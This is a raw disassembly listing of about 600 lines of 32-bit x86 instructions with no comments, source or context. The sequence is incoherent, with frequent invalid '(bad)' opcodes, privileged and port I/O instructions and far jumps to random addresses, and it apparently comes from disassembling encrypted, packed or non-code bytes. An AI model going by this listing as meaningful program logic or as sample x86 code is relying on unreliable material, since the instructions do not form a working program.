  41de42:	sub    eax,0x2b975c16
  41de47:	jp     0x41de94
  41de49:	stc    
  41de4a:	xchg   esp,eax
  41de4b:	sahf   
  41de4c:	adc    ebx,DWORD PTR [eax-0x7]
  41de4f:	fbstp  TBYTE PTR [edi]
  41de51:	out    dx,eax
  41de52:	cld    
  41de53:	and    eax,0x4ad93c57
  41de58:	pop    ebp
  41de59:	cmp    DWORD PTR [ebx],ebp
  41de5b:	test   al,0xa0
  41de5d:	lock xchg ebx,eax
  41de5f:	loopne 0x41de6b
  41de61:	aam    0x4b
  41de63:	mov    ds:0x171e4729,al
  41de68:	pop    ebx
  41de69:	stos   BYTE PTR es:[edi],al
  41de6a:	es in  al,dx
  41de6c:	pop    esi
  41de6d:	js     0x41de29
  41de6f:	xchg   ebx,eax
  41de70:	xor    DWORD PTR [edi+esi*8+0x6d],esp
  41de74:	inc    edx
  41de75:	scas   al,BYTE PTR es:[edi]
  41de76:	mov    esi,0xb051b18f
  41de7b:	push   eax
  41de7c:	inc    esp
  41de7d:	xor    BYTE PTR [ecx-0x4323df],dh
  41de83:	push   DWORD PTR [esi]
  41de85:	lock sbb BYTE PTR ds:[ebp+0x39],al
  41de8a:	leave  
  41de8b:	pop    ebp
  41de8c:	(bad)  
  41de8d:	js     0x41dec2
  41de8f:	mov    esi,0x2bf29c62
  41de94:	cs xor eax,0x4151e4d6
  41de9a:	pop    ss
  41de9b:	inc    ebx
  41de9c:	xchg   DWORD PTR [edi+ecx*8-0x37],edi
  41dea0:	mov    dl,0xe4
  41dea2:	adc    esp,DWORD PTR [edx-0x6a]
  41dea5:	(bad)  
  41dea6:	and    al,0x73
  41dea8:	xlat   BYTE PTR ds:[ebx]
  41dea9:	adc    BYTE PTR [ebx+0x6a],bl
  41deac:	adc    al,0x94
  41deae:	lods   al,BYTE PTR ds:[esi]
  41deaf:	push   ebp
  41deb0:	jecxz  0x41de56
  41deb2:	push   cs
  41deb3:	shl    cl,cl
  41deb5:	push   es
  41deb6:	or     BYTE PTR [esi],0xf0
  41deb9:	rcl    DWORD PTR ds:0xbd64b216,0xba
  41dec0:	dec    edx
  41dec1:	dec    esp
  41dec2:	fsub   DWORD PTR [ebx-0x65]
  41dec5:	push   esi
  41dec6:	xor    al,bl
  41dec8:	ret    
  41dec9:	mov    esp,0x70446042
  41dece:	sbb    DWORD PTR [edi+0x6c5ae026],0xd8b5cd49
  41ded8:	or     eax,0x6ffb9fae
  41dedd:	test   eax,0x7287848c
  41dee2:	jb     0x41dee2
  41dee4:	loope  0x41df07
  41dee6:	shl    BYTE PTR [edi-0x183c8d40],cl
  41deec:	(bad)  
  41deed:	xchg   DWORD PTR [esi-0xd],edx
  41def0:	add    dh,BYTE PTR [edi+0x30]
  41def3:	iret   
  41def4:	xor    al,0x11
  41def6:	fcmovu st,st(3)
  41def8:	dec    esi
  41def9:	push   esp
  41defa:	in     al,dx
  41defb:	xchg   edx,eax
  41defc:	aad    0x82
  41defe:	mov    dl,0x4d
  41df00:	pop    esi
  41df01:	cmp    BYTE PTR [esi+0x21],0x82
  41df05:	scas   eax,DWORD PTR es:[edi]
  41df06:	push   0x21bd822
  41df0b:	and    esi,eax
  41df0d:	cmp    DWORD PTR [ecx-0x7e],eax
  41df10:	lock aad 0xb5
  41df13:	ret    0x7566
  41df16:	jo     0x41df01
  41df18:	ret    0x6c51
  41df1b:	jge    0x41df75
  41df1d:	popa   
  41df1e:	dec    esi
  41df1f:	xor    eax,0xf1545b8d
  41df24:	sbb    edx,eax
  41df26:	test   BYTE PTR [edi-0x18],ch
  41df29:	inc    ecx
  41df2a:	jle    0x41deff
  41df2c:	scas   eax,DWORD PTR es:[edi]
  41df2d:	icebp  
  41df2e:	stos   DWORD PTR es:[edi],eax
  41df2f:	mov    ebp,0x70760f77
  41df34:	leave  
  41df35:	or     DWORD PTR [ebp+0x492ce10f],0xb6f27e44
  41df3f:	cmp    edx,DWORD PTR [edx+eax*8-0x44e6ce5c]
  41df46:	xchg   ecx,eax
  41df47:	fcomi  st,st(2)
  41df49:	inc    ecx
  41df4a:	push   0xfffffff1
  41df4c:	add    DWORD PTR ds:0x1e24e29d,0xfcbe7e19
  41df56:	js     0x41df3b
  41df58:	adc    DWORD PTR [ecx+0x35d63cf7],edx
  41df5e:	pusha  
  41df5f:	les    ecx,FWORD PTR [ebx+0x1a]
  41df62:	cld    
  41df63:	dec    ecx
  41df64:	pusha  
  41df65:	sub    ecx,esi
  41df67:	xor    al,0xfa
  41df69:	xchg   ah,al
  41df6b:	jge    0x41df2d
  41df6d:	push   0xce89e407
  41df72:	aaa    
  41df73:	dec    esp
  41df74:	fst    DWORD PTR [edi+eiz*1]
  41df77:	(bad)  
  41df79:	add    bh,dl
  41df7b:	xchg   ebp,eax
  41df7c:	out    dx,eax
  41df7d:	inc    eax
  41df7e:	sbb    al,BYTE PTR [edx-0x35]
  41df81:	dec    ebx
  41df82:	jle    0x41dffd
  41df84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df85:	push   ebx
  41df86:	adc    DWORD PTR [ebx-0x71261186],ebp
  41df8c:	sbb    bh,BYTE PTR [ebx+0x72f4b728]
  41df92:	cmp    bh,BYTE PTR [ebx-0x36]
  41df95:	ja     0x41dfde
  41df97:	fs inc edi
  41df99:	test   cl,dl
  41df9b:	add    ah,dh
  41df9d:	xor    dh,BYTE PTR [eax-0x56]
  41dfa0:	push   ss
  41dfa1:	lods   al,BYTE PTR ds:[esi]
  41dfa2:	daa    
  41dfa3:	retf   0xe8be
  41dfa6:	inc    ecx
  41dfa7:	xchg   ecx,eax
  41dfa8:	add    al,0x0
  41dfaa:	std    
  41dfab:	ret    0x50f7
  41dfae:	or     BYTE PTR [ecx+0x4546caf2],bh
  41dfb4:	pop    ecx
  41dfb5:	retf   
  41dfb6:	fs jp  0x41dfda
  41dfb9:	lea    eax,[ebp+0x20]
  41dfbc:	out    dx,al
  41dfbd:	jnp    0x41dfaa
  41dfbf:	adc    BYTE PTR [ecx],bl
  41dfc1:	es jmp 0xd6f21671
  41dfc7:	aad    0x8d
  41dfc9:	in     al,dx
  41dfca:	mov    ebx,0x891b818a
  41dfcf:	sahf   
  41dfd0:	scas   al,BYTE PTR es:[edi]
  41dfd1:	and    al,BYTE PTR [esi-0x10]
  41dfd4:	test   eax,0x6081783b
  41dfd9:	xchg   edx,eax
  41dfda:	and    dh,dh
  41dfdc:	pop    ss
  41dfdd:	adc    BYTE PTR [edx-0x7d7ffde],al
  41dfe3:	bound  ecx,QWORD PTR [eax-0x51]
  41dfe6:	ins    DWORD PTR es:[edi],dx
  41dfe7:	dec    edi
  41dfe8:	jecxz  0x41e001
  41dfea:	cdq    
  41dfeb:	xor    ecx,0xbb8758d
  41dff1:	std    
  41dff2:	jbe    0x41df96
  41dff4:	jle    0x41e049
  41dff6:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41dff8:	leave  
  41dff9:	jge    0x41e05d
  41dffb:	push   es
  41dffc:	idiv   BYTE PTR [ebp-0x52]
  41dfff:	jb     0x41e071
  41e001:	fbld   TBYTE PTR ss:[esp+ebp*2]
  41e005:	xchg   ecx,eax
  41e006:	lock aad 0xec
  41e009:	inc    esp
  41e00a:	pop    ecx
  41e00b:	push   esi
  41e00c:	dec    edx
  41e00d:	sbb    al,0xe
  41e00f:	(bad)  
  41e010:	and    eax,0xdfd3f082
  41e015:	jge    0x41e095
  41e017:	mov    ch,0x7e
  41e019:	mov    cl,0x61
  41e01b:	rol    DWORD PTR [edx-0x41],cl
  41e01e:	in     eax,0x16
  41e020:	lods   eax,DWORD PTR ds:[esi]
  41e021:	mov    edi,0xc398f85e
  41e026:	cmp    DWORD PTR [eax+0x1],eax
  41e029:	xor    esi,0xec4d2bfe
  41e02f:	pop    edi
  41e030:	stos   BYTE PTR es:[edi],al
  41e031:	xchg   esp,eax
  41e032:	pop    edx
  41e033:	sbb    BYTE PTR [ecx+0x1ea89e0c],bl
  41e039:	int    0xfe
  41e03b:	and    DWORD PTR [ecx-0x12],0x8a4e552c
  41e042:	lds    ebx,FWORD PTR [ebx-0x799bc031]
  41e048:	icebp  
  41e049:	enter  0xe838,0x7e
  41e04d:	lock hlt 
  41e04f:	leave  
  41e050:	and    DWORD PTR [edi+0x48d94c26],esp
  41e056:	into   
  41e057:	pushf  
  41e058:	jns    0x41e034
  41e05a:	mov    DWORD PTR [ecx-0x63e785f9],esp
  41e060:	shl    edx,1
  41e062:	mov    es,ebp
  41e064:	inc    ebp
  41e065:	jecxz  0x41e0da
  41e067:	xchg   ebx,eax
  41e068:	add    DWORD PTR [ebp-0x64],esi
  41e06b:	add    edi,DWORD PTR [ebx+0x1b24b801]
  41e071:	adc    dl,0xa0
  41e074:	icebp  
  41e075:	push   esi
  41e076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e077:	stos   BYTE PTR es:[edi],al
  41e078:	sub    eax,0xec8dc492
  41e07d:	(bad)  
  41e07f:	call   0xcf0c:0x20a3b2be
  41e086:	mov    esp,0x8cd8defd
  41e08b:	cmc    
  41e08c:	mov    al,ds:0x311ab5be
  41e091:	in     eax,0xe
  41e093:	xchg   BYTE PTR [esi+ebx*2],al
  41e096:	inc    ecx
  41e097:	sbb    al,0x9a
  41e099:	les    edx,FWORD PTR [ecx-0x1e]
  41e09c:	sub    eax,edx
  41e09e:	pop    ecx
  41e09f:	test   al,0x3d
  41e0a1:	dec    ebp
  41e0a2:	imul   ebp,ebp,0xc908c99b
  41e0a8:	jmp    0x41e058
  41e0aa:	sti    
  41e0ab:	mov    ebx,db4
  41e0ae:	xor    DWORD PTR ds:0xa5bc6ba1,esi
  41e0b4:	(bad)  
  41e0b5:	mov    BYTE PTR [edx-0x2800487a],al
  41e0bb:	xchg   ebx,eax
  41e0bc:	stc    
  41e0bd:	xor    esp,DWORD PTR [edx-0xc]
  41e0c0:	ret    
  41e0c1:	fst    st(3)
  41e0c3:	or     al,0xce
  41e0c5:	mov    gs,WORD PTR [edi-0x4a50e12f]
  41e0cb:	fiadd  DWORD PTR [edx]
  41e0cd:	shl    BYTE PTR [edi],cl
  41e0cf:	mov    cl,dl
  41e0d1:	xchg   esp,eax
  41e0d2:	push   es
  41e0d3:	lea    edi,[edi]
  41e0d5:	aad    0xee
  41e0d7:	js     0x41e0c3
  41e0d9:	stc    
  41e0da:	(bad)
  41e0dd:	into   
  41e0de:	jmp    0xa202:0xf9c07dab
  41e0e5:	inc    eax
  41e0e6:	iret   
  41e0e7:	cmp    esi,ebx
  41e0e9:	push   cs
  41e0ea:	push   ebx
  41e0eb:	dec    edx
  41e0ec:	fistp  WORD PTR [edx]
  41e0ee:	inc    ebx
  41e0ef:	inc    ebx
  41e0f0:	mov    ds:0x17f2c0e0,eax
  41e0f5:	push   eax
  41e0f6:	arpl   WORD PTR [esp+edi*4-0x3b],cx
  41e0fa:	(bad)  [edi]
  41e0fc:	ror    BYTE PTR [ecx+eax*8-0xe],1
  41e100:	daa    
  41e101:	pop    eax
  41e102:	jae    0x41e0bf
  41e104:	cdq    
  41e105:	sub    dh,BYTE PTR [esi]
  41e107:	push   eax
  41e108:	dec    eax
  41e109:	ret    
  41e10a:	add    cl,BYTE PTR [eax+eiz*8+0x63dcb3ba]
  41e111:	and    BYTE PTR [ebx+edi*8-0x678a7a6b],dh
  41e118:	mov    ebp,0x98cf2cb5
  41e11d:	out    0x5a,eax
  41e11f:	repnz pop esp
  41e121:	dec    ebp
  41e122:	sbb    BYTE PTR [edx],dl
  41e124:	or     BYTE PTR [ebx+eiz*8-0x5],bl
  41e128:	pop    esi
  41e129:	add    al,0x65
  41e12b:	xor    bh,BYTE PTR [edi]
  41e12d:	add    bh,ch
  41e12f:	popa   
  41e130:	xor    al,0x85
  41e132:	inc    edi
  41e133:	inc    ebx
  41e134:	jnp    0x41e0f0
  41e136:	xchg   edi,eax
  41e137:	pop    ecx
  41e138:	xor    BYTE PTR [ebx-0x5bdce33a],cl
  41e13e:	jae    0x41e1ad
  41e140:	mov    edi,0x657ba19c
  41e145:	push   0x4f9fc932
  41e14a:	lds    esi,FWORD PTR [edi]
  41e14c:	pop    ebx
  41e14d:	jo     0x41e151
  41e14f:	rcl    BYTE PTR [ebx-0x263a59],cl
  41e155:	pusha  
  41e156:	pop    edi
  41e157:	cmp    eax,0x5539f157
  41e15c:	int3   
  41e15d:	(bad)  
  41e15e:	in     eax,0x60
  41e160:	mov    DWORD PTR [edx+eiz*4-0x33],0xbf2bcda0
  41e168:	sbb    al,BYTE PTR [ebx+0xe7b5db5]
  41e16e:	and    BYTE PTR [esi-0x6d],0x7b
  41e172:	jl     0x41e193
  41e174:	inc    esi
  41e175:	mov    ebp,0x387cf5a3
  41e17a:	sahf   
  41e17b:	xor    ch,BYTE PTR [edi-0x4]
  41e17e:	js     0x41e1c0
  41e180:	xchg   ecx,eax
  41e181:	mov    dh,0x61
  41e183:	loope  0x41e139
  41e185:	mov    ch,al
  41e187:	aam    0x11
  41e189:	dec    ecx
  41e18a:	mov    ecx,0x2263a5ac
  41e18f:	jecxz  0x41e1bf
  41e191:	bound  ebx,QWORD PTR [edi-0x30f943a0]
  41e197:	jb     0x41e207
  41e199:	enter  0x1748,0x17
  41e19d:	enter  0x676a,0x1a
  41e1a1:	jge    0x41e15f
  41e1a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1a4:	scas   eax,DWORD PTR es:[edi]
  41e1a5:	shr    DWORD PTR [ebx],0xd2
  41e1a8:	popa   
  41e1a9:	jle    0x41e1f9
  41e1ab:	push   es
  41e1ac:	mov    ah,0xee
  41e1ae:	xor    BYTE PTR [eax+0x62da0101],0x67
  41e1b5:	push   edx
  41e1b6:	fs out 0x24,al
  41e1b9:	xchg   al,bl
  41e1bb:	jnp    0x41e215
  41e1bd:	pop    esi
  41e1be:	mov    edi,0x33017e84
  41e1c3:	sbb    cl,ah
  41e1c5:	aas    
  41e1c6:	ss dec edx
  41e1c8:	add    DWORD PTR [ecx+0x13963f71],0x7a
  41e1cf:	push   0xffffffe3
  41e1d1:	scas   al,BYTE PTR es:[edi]
  41e1d2:	bound  eax,QWORD PTR [eax+0x45e38ff4]
  41e1d8:	mov    WORD PTR [edx+0x74],gs
  41e1db:	lods   al,BYTE PTR ds:[esi]
  41e1dc:	adc    ecx,DWORD PTR ds:0x404458b4
  41e1e2:	push   edi
  41e1e3:	push   edi
  41e1e4:	mov    ah,0x8f
  41e1e6:	clc    
  41e1e7:	call   0xf559:0xf5def771
  41e1ee:	jnp    0x41e1f9
  41e1f0:	add    BYTE PTR [eax-0x24ce07eb],cl
  41e1f6:	cwde   
  41e1f7:	xchg   ecx,eax
  41e1f8:	imul   edx,DWORD PTR [edx],0xffffffaa
  41e1fb:	dec    ecx
  41e1fc:	push   ecx
  41e1fd:	out    0x1e,eax
  41e1ff:	mov    ecx,0x1d55ff2
  41e204:	xchg   BYTE PTR [ecx],cl
  41e206:	imul   ebp,esp,0xa6b3a2d0
  41e20c:	retf   
  41e20d:	(bad)  
  41e20e:	loop   0x41e251
  41e210:	push   eax
  41e211:	or     cl,al
  41e213:	and    al,0x33
  41e215:	sbb    al,0x6e
  41e217:	xor    bh,cl
  41e219:	cs ja  0x41e236
  41e21c:	fild   QWORD PTR [ecx+0x18aa104c]
  41e222:	dec    esp
  41e223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e224:	into   
  41e225:	mov    bh,0xf8
  41e227:	mov    ah,0xcd
  41e229:	and    BYTE PTR [eax-0x728761c7],0xa4
  41e230:	outs   dx,BYTE PTR ds:[esi]
  41e231:	pop    eax
  41e232:	stos   BYTE PTR es:[edi],al
  41e233:	mov    ds:0x9a4846c7,eax
  41e238:	mov    ds:0x6d7ccaab,eax
  41e23d:	xor    eax,0xc3a36f24
  41e242:	fstp   DWORD PTR [ebp+0x22816a4f]
  41e248:	enter  0xe61e,0x41
  41e24c:	mov    ecx,0x814f0119
  41e251:	push   ds
  41e252:	xchg   esp,eax
  41e253:	popf   
  41e254:	inc    esi
  41e255:	fisttp DWORD PTR [edi+0x1d8dd027]
  41e25b:	dec    esp
  41e25c:	pop    ecx
  41e25d:	(bad)  
  41e25e:	xor    DWORD PTR [ecx-0x13455b29],ecx
  41e264:	ja     0x41e251
  41e266:	xchg   ecx,eax
  41e267:	pushf  
  41e268:	sti    
  41e269:	imul   esp,DWORD PTR [esi+ebp*8-0x3b0fb8f1],0xffffffed
  41e271:	push   edi
  41e272:	nop
  41e273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e274:	lds    esp,FWORD PTR [ebx]
  41e276:	imul   esp,DWORD PTR [esi],0xd49df878
  41e27c:	xlat   BYTE PTR ds:[ebx]
  41e27d:	push   edi
  41e27e:	and    eax,0x676f59d9
  41e283:	cld    
  41e284:	and    eax,DWORD PTR [edx+ecx*4+0x48]
  41e288:	pmaxub mm5,QWORD PTR [ecx+0xf1a4192]
  41e28f:	test   BYTE PTR [ebx-0x5d06e66d],ah
  41e295:	xchg   esp,eax
  41e296:	dec    ecx
  41e297:	mov    bl,0xc3
  41e299:	jg     0x41e312
  41e29b:	push   edx
  41e29c:	pop    esp
  41e29d:	pop    ss
  41e29e:	enter  0x5aa8,0x7d
  41e2a2:	fcomp  QWORD PTR [edi-0x5d]
  41e2a5:	add    DWORD PTR [ebx+0x782a93db],ebx
  41e2ab:	clc    
  41e2ac:	(bad)  
  41e2ae:	jo     0x41e31f
  41e2b0:	retf   
  41e2b1:	mov    WORD PTR [ecx-0x30],?
  41e2b4:	jge    0x41e2ae
  41e2b6:	into   
  41e2b7:	xchg   ebx,eax
  41e2b8:	aas    
  41e2b9:	rcl    BYTE PTR [esi+0x13baffe3],1
  41e2bf:	jecxz  0x41e266
  41e2c1:	mov    ds:0xce13e83c,eax
  41e2c6:	mov    ah,0xeb
  41e2c8:	lods   al,BYTE PTR ds:[esi]
  41e2c9:	inc    eax
  41e2ca:	xor    eax,0x15000e47
  41e2cf:	stc    
  41e2d0:	xchg   esp,eax
  41e2d1:	mov    ds:0xfab5bd9a,eax
  41e2d6:	mov    bl,0x86
  41e2d8:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41e2da:	mov    dh,0xc9
  41e2dc:	push   esi
  41e2dd:	dec    edi
  41e2de:	inc    edi
  41e2df:	pop    es
  41e2e0:	call   0x1aff786f
  41e2e5:	mov    ds:0xa69a90f4,eax
  41e2ea:	inc    ecx
  41e2eb:	ficomp WORD PTR [ebx]
  41e2ed:	shl    esi,0xa6
  41e2f0:	shl    BYTE PTR [ebp+0x72],0x36
  41e2f4:	loope  0x41e325
  41e2f6:	or     al,0xde
  41e2f8:	aaa    
  41e2f9:	mov    ah,0x47
  41e2fb:	lea    edi,[ecx+0x2d]
  41e2fe:	pop    ecx
  41e2ff:	hlt    
  41e300:	mov    ch,dh
  41e302:	sbb    eax,0xa7e4054f
  41e307:	sub    cl,BYTE PTR [ebx]
  41e309:	or     eax,DWORD PTR [ebp-0x5ea380e2]
  41e30f:	dec    esp
  41e310:	jmp    0x8c72256b
  41e315:	pop    ecx
  41e316:	jnp    0x41e2af
  41e318:	wrmsr  
  41e31a:	mov    cl,BYTE PTR ds:0x34229b94
  41e320:	xchg   edi,eax
  41e321:	cld    
  41e322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e323:	cmp    eax,edi
  41e325:	in     eax,0xc5
  41e327:	mov    ah,0x33
  41e329:	add    DWORD PTR [esp+eiz*2+0x1f],edx
  41e32d:	add    BYTE PTR [ebx],dh
  41e32f:	sub    DWORD PTR [ebx],0x17
  41e332:	inc    edi
  41e333:	pop    esp
  41e334:	or     BYTE PTR [ecx+ecx*8],bh
  41e337:	xchg   ebp,eax
  41e338:	lds    esp,FWORD PTR [edx+0x34]
  41e33b:	les    ebx,FWORD PTR [eax+ebp*2+0x6015893]
  41e342:	xchg   BYTE PTR [eax+0x3c],bl
  41e345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e346:	inc    edi
  41e347:	in     eax,dx
  41e348:	sbb    BYTE PTR ds:0x9124a79c,dl
  41e34e:	jmp    0x41e2e7
  41e350:	inc    ebx
  41e351:	loope  0x41e363
  41e353:	in     eax,dx
  41e354:	and    ebp,esi
  41e356:	sahf   
  41e357:	stos   DWORD PTR es:[edi],eax
  41e358:	add    BYTE PTR [ecx],dl
  41e35a:	cs pop eax
  41e35c:	scas   eax,DWORD PTR es:[edi]
  41e35d:	in     eax,dx
  41e35e:	xor    eax,ecx
  41e360:	adc    DWORD PTR [ebp-0x2a],0xaa6220d2
  41e367:	mov    al,ds:0xd20234e3
  41e36c:	adc    bl,BYTE PTR [eax-0x3e]
  41e36f:	or     ecx,ebp
  41e371:	xor    al,0xb
  41e373:	into   
  41e374:	call   0x8293e67e
  41e379:	pop    ebp
  41e37a:	sub    eax,0x8789beb
  41e37f:	fdivr  st,st(6)
  41e381:	bound  eax,QWORD PTR [ecx-0x3f]
  41e384:	jae    0x41e3c8
  41e386:	nop
  41e387:	inc    esi
  41e388:	push   eax
  41e389:	jmp    0xb95b5087
  41e38e:	fbld   TBYTE PTR [ebx+ecx*8-0x4b27bb21]
  41e395:	sbb    eax,0xfc8ef571
  41e39a:	cs retf 0x3aed
  41e39e:	sub    al,0x37
  41e3a0:	popa   
  41e3a1:	mov    al,ds:0xeffa5f53
  41e3a6:	mov    al,0x71
  41e3a8:	mov    ebp,0xe94597d9
  41e3ad:	adc    eax,0xe4a05d96
  41e3b2:	push   edx
  41e3b3:	enter  0x8b5b,0x53
  41e3b7:	cmp    DWORD PTR [edi-0x3c3e00fe],ecx
  41e3bd:	and    BYTE PTR [esi],bl
  41e3bf:	sub    DWORD PTR [esi+0x3e],esi
  41e3c2:	pop    esi
  41e3c3:	fnstcw WORD PTR ds:0xe8e368f6
  41e3c9:	out    0x37,al
  41e3cb:	jp     0x41e360
  41e3cd:	sub    al,0x22
  41e3cf:	dec    edi
  41e3d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3d1:	mov    BYTE PTR [ecx],ah
  41e3d3:	mov    esi,ss
  41e3d5:	test   eax,0xdffb850f
  41e3da:	or     bl,0x58
  41e3dd:	dec    ebp
  41e3de:	push   esp
  41e3df:	push   esi
  41e3e0:	jmp    0xd28d:0x4c2eef40
  41e3e7:	push   es
  41e3e8:	mov    ebx,0x2136ffe0
  41e3ed:	ins    DWORD PTR es:[edi],dx
  41e3ee:	adc    al,0x68
  41e3f0:	and    eax,DWORD PTR [edi]
  41e3f2:	stos   BYTE PTR es:[edi],al
  41e3f3:	push   0xffffffe2
  41e3f5:	int3   
  41e3f6:	cld    
  41e3f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3f8:	stc    
  41e3f9:	adc    ebx,DWORD PTR [ecx]
  41e3fb:	loop   0x41e46b
  41e3fd:	loop   0x41e395
  41e3ff:	popa   
  41e400:	push   es
  41e401:	popf   
  41e402:	pop    esi
  41e403:	xchg   ebx,eax
  41e404:	adc    DWORD PTR [edi],0x27
  41e407:	sbb    ah,ah
  41e409:	mov    ds:0xfaebe2b0,al
  41e40e:	inc    esi
  41e40f:	ins    DWORD PTR es:[edi],dx
  41e410:	das    
  41e411:	jno    0x41e3af
  41e413:	leave  
  41e414:	icebp  
  41e415:	dec    edi
  41e416:	fwait
  41e417:	sbb    DWORD PTR [eax+0x12],0x66
  41e41b:	es xchg ecx,eax
  41e41d:	neg    BYTE PTR ds:0xae4d2a2d
  41e423:	pop    esi
  41e424:	cmp    al,0x4
  41e426:	push   ss
  41e427:	sti    
  41e428:	and    ebp,edx
  41e42a:	push   0xffffffa1
  41e42c:	cmp    WORD PTR [ebp-0x1f37c9d6],si
  41e433:	loop   0x41e428
  41e435:	cdq    
  41e436:	mov    eax,0x2d2b977c
  41e43b:	sar    DWORD PTR [eax],cl
  41e43d:	xor    eax,0xe4e77c6b
  41e442:	loope  0x41e4c2
  41e444:	xchg   ebp,eax
  41e445:	loop   0x41e4c2
  41e447:	ficomp DWORD PTR [ebx]
  41e449:	dec    edi
  41e44a:	cli    
  41e44b:	mov    eax,ds:0x44718705
  41e450:	adc    DWORD PTR [esi+0x3a],eax
  41e453:	xchg   ecx,eax
  41e454:	mov    ds:0x2ebcfee,al
  41e459:	call   0xe870:0xda2a5802
  41e460:	mov    edi,ss
  41e462:	cmp    BYTE PTR [edx-0x5f],bh
  41e465:	and    eax,0xabec3c3
  41e46a:	sbb    BYTE PTR [ecx],al
  41e46c:	pusha  
  41e46d:	pop    eax
  41e46e:	ror    BYTE PTR [edx+0x4c3e48d8],0xf8
  41e475:	rcl    DWORD PTR [eax-0x9],cl
  41e478:	adc    ax,0xbbd9
  41e47c:	sbb    BYTE PTR [ecx],dh
  41e47e:	mov    DWORD PTR [edi+0x67e16930],edi
  41e484:	das    
  41e485:	ja     0x41e479
  41e487:	rol    BYTE PTR [edx+0x27],1
  41e48a:	inc    edi
  41e48b:	(bad)  
  41e48c:	(bad)  
  41e48d:	push   ebx
  41e48e:	addr16 xchg ebx,eax
  41e490:	scas   al,BYTE PTR es:[edi]
  41e491:	fisttp QWORD PTR [eax]
  41e493:	lahf   
  41e494:	lods   eax,DWORD PTR ds:[esi]
  41e495:	push   0xa
  41e497:	cmp    al,0x42
  41e499:	jg     0x41e505
  41e49b:	sub    bh,ah
  41e49d:	mov    ebp,0x37a74cdf
  41e4a2:	xor    esi,0xffcf37e
  41e4a8:	int    0x77
  41e4aa:	sbb    DWORD PTR [eax-0x4d],eax
  41e4ad:	push   es
  41e4ae:	mov    cl,0xa3
  41e4b0:	int3   
  41e4b1:	in     al,dx
  41e4b2:	ins    BYTE PTR es:[edi],dx
  41e4b3:	mov    dh,BYTE PTR [edi+ebp*8+0x4743aa47]
  41e4ba:	aad    0xcf
  41e4bc:	popf   
  41e4bd:	hlt    
  41e4be:	fcomp  QWORD PTR ds:0x383d11e6
  41e4c4:	xchg   ebp,eax
  41e4c5:	mov    edx,0xfb0c6a03
  41e4ca:	retw   
  41e4cc:	add    edx,DWORD PTR [edi+edx*2]
  41e4cf:	push   eax
  41e4d0:	adc    edx,DWORD PTR [eax+0x17]
  41e4d3:	pushf  
  41e4d4:	fdivr  QWORD PTR [edx]
  41e4d6:	jmp    0x7c3b:0x740d8690
  41e4dd:	loope  0x41e4d6
  41e4df:	mov    BYTE PTR [eax+0x29daf86],al
  41e4e5:	(bad)  
  41e4e6:	repz daa 
  41e4e8:	mov    esi,DWORD PTR [eax+ebx*2]
  41e4eb:	sub    DWORD PTR [edi-0x3edaf034],0x3b
  41e4f2:	jp     0x41e4a5
  41e4f4:	scas   eax,DWORD PTR es:[edi]
  41e4f5:	xchg   BYTE PTR [ecx+0x79],ch
  41e4f8:	lea    esp,[esi+0x3d]
  41e4fb:	mov    fs:0x1d7ef85c,eax
  41e501:	fistp  DWORD PTR [ebp+0x7e]
  41e504:	inc    edx
  41e505:	fwait
  41e506:	js     0x41e4dc
  41e508:	adc    ebp,ebx
  41e50a:	and    al,0xd4
  41e50c:	sub    cl,BYTE PTR [eax]
  41e50e:	xchg   ebx,eax
  41e50f:	xor    ebp,DWORD PTR [edx]
  41e511:	sub    DWORD PTR [edi-0x34],ebp
  41e514:	(bad)  
  41e515:	cdq    
  41e516:	arpl   WORD PTR [edi-0x3c],cx
  41e519:	pop    edx
  41e51a:	xchg   ebx,eax
  41e51b:	retf   0x2499
  41e51e:	mov    ebx,0x362a451b
  41e523:	int    0x6a
  41e525:	scas   eax,DWORD PTR es:[edi]
  41e526:	xor    eax,0xc832a588
  41e52b:	pop    ds
  41e52c:	xchg   ebx,eax
  41e52d:	adc    esp,ebx
  41e52f:	sbb    eax,0xd6240200
  41e534:	ror    BYTE PTR [esi+edx*4-0x4a],0xca
  41e539:	pusha  
  41e53a:	adc    al,0x22
  41e53c:	fbld   TBYTE PTR [eax]
  41e53e:	fwait
  41e53f:	fs icebp 
  41e541:	fcomp  st(2)
  41e543:	xchg   ebp,eax
  41e544:	outs   dx,BYTE PTR ds:[esi]
  41e545:	test   DWORD PTR [esi+0x63],edi
  41e548:	rcl    ch,1
  41e54a:	jmp    0xa32710f6
  41e54f:	gs mov dh,0x1c
  41e552:	and    BYTE PTR [edx-0x6f95d0a2],0x16
  41e559:	jnp    0x41e5c3
  41e55b:	aad    0x49
  41e55d:	sar    DWORD PTR [edi+0xa566df1],cl
  41e563:	shl    cl,cl
  41e565:	or     cl,bh
  41e567:	retf   0xf4a6
  41e56a:	jle    0x41e54a
  41e56c:	fist   DWORD PTR [ebx-0x6cf60e77]
  41e572:	xlat   BYTE PTR ds:[ebx]
  41e573:	sbb    bh,BYTE PTR [esi+0x6f]
  41e576:	adc    cl,dl
  41e578:	jno    0x41e54b
  41e57a:	or     eax,0x1203e9d6
  41e57f:	mov    bl,0x48
  41e581:	xchg   ebx,eax
  41e582:	cmp    esi,DWORD PTR [bx]
  41e585:	jnp    0x41e564
  41e587:	arpl   WORD PTR [ecx],sp
  41e589:	add    DWORD PTR [esi],ebp
  41e58b:	or     DWORD PTR [edi],0xba13a430
  41e591:	sbb    eax,0xddb05245
  41e596:	in     eax,0xe2
  41e598:	or     al,0x9
  41e59a:	mov    ?,WORD PTR [ebp+0x61]
  41e59d:	add    dl,BYTE PTR [ebp-0x74563596]
  41e5a3:	pop    eax
  41e5a4:	bound  esi,QWORD PTR [edi]
  41e5a6:	push   esp
  41e5a7:	adc    eax,0x951ca729
  41e5ac:	ss or  eax,0x175a839b
  41e5b2:	sub    esp,esp
  41e5b4:	inc    edx
  41e5b5:	fwait
  41e5b6:	cmp    al,0x14
  41e5b8:	ret    
  41e5b9:	inc    eax
